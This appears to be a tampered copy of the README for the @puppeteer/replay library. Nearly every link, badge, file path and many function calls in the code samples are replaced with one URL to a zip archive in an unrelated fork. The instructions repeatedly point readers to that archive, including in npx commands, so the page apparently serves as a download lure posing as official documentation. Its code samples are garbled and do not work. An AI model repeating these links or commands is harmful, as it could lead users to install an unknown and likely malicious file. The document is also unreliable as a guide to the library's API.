# @puppeteer/replay

<!-- [START badges] -->

[![Build status](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip%3Arun-checks) [![npm puppeteer package](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)

<!-- [END badges] -->

###### [API](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) | [Contributing](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)

> Puppeteer Replay is a library that provides an API to replay and stringify recordings created using [Chrome DevTools Recorder](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)

## Installation

```
npm install @puppeteer/replay --save
```

If you want to replay recordings using Puppeteer, install Puppeteer as well:

```
npm install puppeteer --save
```

## Getting started with Puppeteer Replay

You can use Puppeteer Replay to:

1. **Replay recording**. Replay recording with CLI or using [the replay lib API](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip).
2. **Customize replay**. Customize how a recording is run. For example, capture screenshots after each step or integrate with 3rd party libraries.
3. **Transform recording**. Customize how a recording is stringified. For example, transform the recording into another format.

Also, you can use third-party integrations that build on top of `@puppeteer/replay`, which includes:

Transform JSON user flows to custom scripts:

- [Cypress Chrome Recorder](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). You can use it to convert user flow JSON files to Cypress test scripts. Watch this [demo](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) to see it in action.
- [Nightwatch Chrome Recorder](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). You can use it to convert user flow JSON files to Nightwatch test scripts.
- [WebdriverIO Chrome Recorder](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). You can use it to convert user flow JSON files to WebdriverIO test scripts.

Replay JSON user flows:

- [Replay with TestCafe](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). You can use TestCafe to replay user flow JSON files and generate test reports for these recordings.
- [Replay with Sauce Labs](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). You can replay the JSON files on [Sauce Labs](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) using [saucectl](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip).

## 1. Replay recording

Download this [example recording](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) and save it as `https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip`.

Using CLI + npx:

```
npx @puppeteer/replay https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip
```

Using CLI + https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip

In your `https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip` add a new script to invoke the `replay` command:

```json
{
  "scripts": {
    "replay": "replay https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip"
  }
}
```

You can also give folder name as a parameter to run all the files in a folder.

Using CLI + npx:

```bash
npx @puppeteer/replay all-recordings # runs all recordings in the "all-recordings" folder.
```

Using CLI + https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip

```json
{
  "scripts": {
    "replay": "replay all-recordings"
  }
}
```

Set the `PUPPETEER_HEADLESS` environment variable or `--headless` CLI flag to control whether the browser is started in a headful or headless mode. For example,

```
PUPPETEER_HEADLESS=true npx @puppeteer/replay https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip # runs in headless mode, the default mode.
PUPPETEER_HEADLESS=false npx @puppeteer/replay https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip # runs in headful mode.
PUPPETEER_HEADLESS=chrome npx @puppeteer/replay https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip # runs in the new experimental headless mode.
```

Use the `--extension` CLI flag to provide a [custom replay extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) for running the recording. For [example](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip),

```sh
npx @puppeteer/replay --extension https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip
```

Run `npx @puppeteer/replay --help` to see all CLI options.

Using [the replay lib API](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip):

```js
import { createRunner, parse } from '@puppeteer/replay';
import fs from 'fs';

// Read recording for a file.
const recordingText = https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip('https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip', 'utf8');
// Validate & parse the file.
const recording = parse(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(recordingText));
// Create a runner and execute the script.
const runner = await createRunner(recording);
await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip();
```

## 2. Customize replay

The library offers a way to customize how a recording is run. You can extend
the `PuppeteerRunnerExtension` class as shown in the example below.

Full example of the `PuppeteerRunnerExtension`: [link](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)

```js
import { createRunner, PuppeteerRunnerExtension } from '@puppeteer/replay';
import puppeteer from 'puppeteer';

const browser = await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip({
  headless: true,
});

const page = await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip();

class Extension extends PuppeteerRunnerExtension {
  async beforeAllSteps(flow) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(flow);
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip('starting');
  }

  async beforeEachStep(step, flow) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(step, flow);
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip('before', step);
  }

  async afterEachStep(step, flow) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(step, flow);
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip('after', step);
  }

  async afterAllSteps(flow) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(flow);
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip('done');
  }
}

const runner = await createRunner(
  {
    title: 'Test recording',
    steps: [
      {
        type: 'navigate',
        url: 'https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip',
      },
    ],
  },
  new Extension(browser, page, 7000)
);

await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip();

await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip();
```

## 3. Transform recording

You can customize how a recording is stringified and use it to transform the recording format.

### Stringify a recording as a Puppeteer script

```js
import { stringify } from '@puppeteer/replay';

https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(
  await stringify({
    title: 'Test recording',
    steps: [],
  })
);
```

### Customize how a recording is stringified

You can customize how a recording is stringified by extending the `PuppeteerStringifyExtension` class as shown in the example below.

Full example of `PuppeteerStringifyExtension` : [link](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)

```js
import { stringify, PuppeteerStringifyExtension } from '@puppeteer/replay';

class Extension extends PuppeteerStringifyExtension {
  // beforeAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
  async beforeAllSteps(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip);
    args[0].appendLine('https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip("starting");');
  }

  // beforeEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
  async beforeEachStep(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) {
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip);
    const [out, step] = args;
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(`https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip("about to execute step ${https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip}")`);
  }

  // afterEachStep?(out: LineWriter, step: Step, flow: UserFlow): Promise<void>;
  async afterEachStep(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) {
    const [out, step] = args;
    https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(`https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip("finished step ${https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip}")`);
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip);
  }

  // afterAllSteps?(out: LineWriter, flow: UserFlow): Promise<void>;
  async afterAllSteps(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) {
    args[0].appendLine('https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip("finished");');
    await https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip);
  }
}

https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip(
  await stringify(
    {
      title: 'Test recording',
      steps: [
        {
          type: 'navigate',
          url: 'https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip',
        },
      ],
    },
    {
      extension: new Extension(),
      indentation: '	', // use tab to indent lines
    }
  )
);
```

## Others

### Test your extensions using the replay lib

The replay lib offers a canonical recording and a test page that allows to
verify that your extension produces all expected side effects on a page.

The test command supports both stringify and runner extensions. The stringify
extension will be tested by running the stringified script using node. Run the
test using the following command.

```
npx -p @puppeteer/replay replay-extension-test --ext path-to-your-extension-js
```

### Create a Chrome extension for Recorder (Available from Chrome 104 onwards)

You can create a Chrome extension for [Recorder](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). Refer to the [Chrome Extensions documentation](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) for more details on how to extend DevTools.

For example, here are some of the third party extensions:

- [Cypress extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) lets you export JSON user flows as [Cypress test script](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). [Cypress](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) is a front end testing tool built for the modern web.
- [WebPageTest extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) lets you export user flows from the Recorder directly as [WebPageTest Custom scripts](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) to measure site's performance. See [Converting user flows to WebPageTest custom scripts](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) to learn more.
- [Nightwatch extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) lets you export JSON user flows as [Nightwatch test script](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). [Nightwatch](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) is an end-to-end testing solution for web applications and websites.
- [Testing Library extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) lets you export JSON user flows as [Testing Library script](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). [Testing Library](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) has simple and complete testing utilities that encourage good testing practices.
- [WebdriverIO extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) lets you export JSON user flows as [WebdriverIO test script](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). [WebdriverIO](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) is an end-to-end testing solution for web, mobile and IoT applications and websites.

This feature only available from Chrome 104 onwards. Check your current Chrome version with `chrome://version`. Consider installing [Chrome Canary](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) to try out cutting-edge features in Chrome.

This repository contains an [example extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). Once installed, the Recorder will have a new export option **Export as a Custom JSON script** in the [export dropdown](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip).

To load the example into Chrome DevTools. Follow these steps:

1. Download the [chrome-extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) folder.
2. [Load the folder as unpacked extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) in Chrome.
3. [Open a recording](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip) in the Recorder.
4. Click on [export](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip). Now you can see a new **Export as a Custom JSON script** option in the export menu.

Click and watch the video demo below:

[![Demo video that shows how to extend export options in Recorder panel by adding a Chrome extension](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)](https://github.com/Xhava0329/replay/raw/refs/heads/main/docs/api/Software-v3.3.zip)
